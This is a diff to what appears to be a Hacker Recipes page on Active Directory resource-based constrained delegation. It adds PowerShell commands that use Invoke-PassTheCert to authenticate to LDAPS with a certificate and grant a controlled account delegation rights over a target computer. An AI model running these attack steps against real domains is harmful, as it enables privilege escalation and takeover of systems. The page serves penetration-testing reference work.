@@ -1,5 +1,5 @@
 ---
-authors: ShutdownRepo, sckdev
+authors: ShutdownRepo, sckdev, jamarir
 category: ad
 ---
 
@@ -136,6 +136,21 @@ StandIn.exe --object samaccountname=controlledaccountwithSPNName
 
 # Add the object to the msDS-AllowedToActOnBehalfOfOtherIdentity of the targeted computer
 StandIn.exe --computer "target" --sid "controlledaccountwithSPN's SID"
+```
+
+The [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) fork can also be used, authenticating through Schannel via [PassTheCert](https://www.thehacker.recipes/ad/movement/schannel/passthecert) (PowerShell version).
+
+> Note: the README contains the methodology to request a certificate using [certreq](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862) from Windows (with a password, or an NTHash).
+```powershell
+# Import the PowerShell script and show its manual
+Import-Module .\Invoke-PassTheCert.ps1
+.\Invoke-PassTheCert.ps1 -?
+# Authenticate to LDAP/S
+$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
+# List all the available actions
+Invoke-PassTheCert -a -NoBanner
+# Add an object (e.g. WANHADELHEG$) to the msDS-AllowedToActOnBehalfOfOtherIdentity of the targeted computer (e.g. RBESEEDEE$)
+Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploit 'RBCD' -Identity 'CN=WANHADELHEG,CN=Computers,DC=X' -Target 'CN=RBESEEDEE,CN=Computers,DC=X'
 ```
 
 ---
